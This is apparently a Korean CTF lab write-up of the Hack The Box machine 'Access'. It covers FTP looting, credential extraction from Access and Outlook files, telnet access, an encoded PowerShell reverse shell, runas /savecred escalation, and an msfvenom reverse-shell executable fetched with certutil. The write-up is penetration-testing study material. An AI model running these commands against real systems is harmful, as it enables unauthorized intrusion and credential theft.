# HTB-ACCESS
```
OS: Windows
DATE: 26.09.11
DIFFICULTY: Easy
```

## RECON
**nmap**: 초기 IP를 받고 전체 포트 검사와 상세 포트 검사를 진행했다.
```bash
nmap -p- -T4 IP
```
```bash
nmap -sC -sV -p 21,23,80 IP
```
검사를 통해 21번 포트 FTP 서비스에 anonymous 접속이 가능하다는 것을 알게 되었고, Telnet과 HTTP 서버도 돌아간다는 것을 알게 되었다. 가장 먼저 HTTP 서비스에 접속해보았는데 별다른 페이지 없이 사진 한 장밖에 없어, bruteforce를 통해 웹 디렉토리와 서브도메인을 열거해보았지만 아무런 정보를 얻지 못했다.
```bash
ffuf -u IP -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H "Host:FUZZ.IP"
```
```bash
ffuf -u IP -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -r -c
```
이후 FTP 서비스에 anonymous로 접속하여 Backups 폴더 안에 있는 `backup.mdb` 파일과 Engineer 폴더 안에 있는 `Access Control.zip` 파일을 얻을 수 있었다.
```bash
ftp IP
Name: anonymous
230 User Logged in.
```

## Initial Access
FTP에서 얻은 backup.mdb 파일이 어떤 파일인지 확인해보니 `Microsoft Database` 확장자라는 것을 알 수 있었다. 따라서 Linux에서 mdb 확장자를 열 수 있는 도구를 찾아보니 `mdb-sql`이라는 도구가 있어 다운로드 후 사용해보았지만 사용이 불가능했다. `offset 7585302654976 is beyond EOF`라는 문구를 보니 파일의 말도 안 되는 위치를 가리키고 있어 파일이 깨졌다는 것을 알 수 있었다. 따라서 FTP에서 `bin` 바이너리 모드로 세팅한 후 다시 다운로드를 진행했다.
```bash
ftp IP
ftp> bin
ftp> get backup.mdb
```
이후 `mdb-table` 도구로 테이블을 열거해보니 많은 테이블들이 있었다. 계속해서 찾아본 결과 USERINFO 테이블에 name과 password가 있었다. 그리고 **auth_user** 테이블에도 유저명과 password가 있었다. 여러 크리덴셜을 확보해두고 Telnet 접속을 시도했지만 모든 credential로 접속이 불가능했다.
```bash
mdb-table backup.mdb auth_user
```
따라서 아까 FTP에서 받은 또 다른 파일인 `Access Control.zip`을 unzip했지만 실패했다. 에러를 확인해보니 `compression method 99`라는 오류가 떴다. 이 파일이 암호화되어 있다는 것을 알게 되어 `7z`라는 도구를 사용하여 zip을 열려고 시도했고, 아까 나왔던 비밀번호 중 하나로 압축 풀기가 가능했다.
```bash
7z x 'Access Control.zip'
```
압축을 풀어보니 `'Access Control.pst'`라는 파일이 나왔고, pst라는 확장자를 검색해보니 MS 전용 데이터 저장 파일 포맷인 것을 알게 되었다. PST는 cat 같은 도구로 읽으면 HEX만 나와서 **readpst**라는 도구를 사용하여 Linux에서 읽을 수 있는 형식으로 변환해주었다. 따라서 .mbox 확장자 파일을 얻을 수 있었다.
```bash
readpst 'Access Control.pst'
```
파일 안에는 security라는 유저 credential이 있어 바로 Telnet으로 접속을 시도한 결과 쉘을 얻을 수 있었다.
```bash
telnet IP
login: security
password: PASS
```
하지만 Telnet 쉘은 너무 불편하여 nc 쉘로 옮기기 위해 PowerShell reverse shell 페이로드를 만든 다음, 파일이 깨지지 않도록 인코딩한 후 쉘에 접속할 수 있었다.
```bash
cat > shell.ps1 << 'EOF'
PAYLOAD
EOF
```
```bash
cat shell.ps1 | iconv -t UTF-16LE | base64 -w0
IAAAJSDIDIDJSK.....
```
```cmd
powershell -e IA IAAAJSDIDIDJSK.....
```
![user](attach_real/Pasted%20image%2020260914152613.png)

## Privilege Escalation
쉘을 얻은 후 권한들을 확인해보았지만 특별한 정보는 없었다. 따라서 `cmdkey /list` 명령어를 실행해본 결과 출력할 수 있었다.
```ps1
cmdkey /list
```
안에 내용은 **TARGET**, **Type**, **User**가 있었다. 이 컴퓨터 비밀번호 보관함 안에 admin의 비밀번호가 저장되어 있다는 것을 알게 되었다. 그 저장된 비밀번호를 꺼내 쓰기 위해 `runas`라는 도구에 **/savecred** 옵션을 사용하여 관리자 권한으로 명령어를 실행할 수 있었다.
```ps1
runas /savecred /user:DOMAIN\USER "cmd -c type C:\Users\Administrator\Desktop\root.txt > C:\Users\security\root.txt"
```
이를 통해 root flag는 얻을 수 있었지만, OSCP는 쉘을 따야 하기 때문에 쉘을 얻기 위해 msfvenom으로 exe 확장자 reverse_shell 페이로드를 만들어 security 유저 디렉토리에 심었다.
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe -o shell.exe
```
```bash
python3 -m http.server
```
```ps1
certutil -urlcache -split -f "http://IP/shell.exe" -o C:\Users\security
```
이후 shell.exe 파일을 관리자 권한으로 실행한 후 SYSTEM 쉘을 얻을 수 있었다.
```ps1
runas /savecred /user:DOMAIN\USER C:\Users\security\shell.exe
```
![system](attach_real/Pasted%20image%2020260914155508.png)

## New Inform
- FTP에는 두 가지 전송 모드가 있다. ASCII 모드: 텍스트 전용. **Binary 모드**: 그 외 모든 파일. 기본값이 ASCII 모드이기 때문에 파일을 받을 때 무조건 `bin`을 켜줘야 한다.
- 여러 테이블을 조회하자.
- unzip이 안 되면 암호화된 것일 수도 있다.
- 7z: 명령줄 압축·해제 도구. **옵션**: x(풀기), l(리스트)
- .pst: Personal Storage Table. `Microsoft Outlook`에서 데이터를 저장하는 파일 포맷. Outlook 전용 바이너리.
- .mbox: 표준 메일 포맷. 텍스트 형태.
- ps1 쉘을 만들 때 `echo "이런 형태"로 만들면 `$변수`가 사라진다. 따라서 파일을 만들고 집어넣어야 한다.
- 쉘을 base64로 인코딩할 때 `iconv -t UTF-16LE` 옵션이 필수다. PowerShell의 `-e` 옵션은 UTF-16LE 인코딩을 요구하기 때문에 무조건 넣어줘야 하고, `base64 -w0` 옵션으로 줄바꿈 없이 출력해줘야 한다.
- Windows에는 **Credential Manager(자격 증명 관리자)**라는 게 있다. 쉽게 말하면 비밀번호 보관함이다. 여기에 비밀번호를 저장해두면 다음부터는 비밀번호 없이 자동으로 사용한다. 이 보관함에 뭐가 들어있는지 보는 명령어가 **cmdkey /list**다.
- cmdkey /list를 통해 관리자 비밀번호가 저장되어 있는 것을 알게 되면, runas의 /savecred 옵션을 사용하여 관리자 권한으로 명령어 실행이 가능하다.
- runas는 쉘 창에서 실행되는 게 아니라 별개의 새로운 프로세스에서 실행되기 때문에, 출력을 파일에 따로 담아줘야 한다.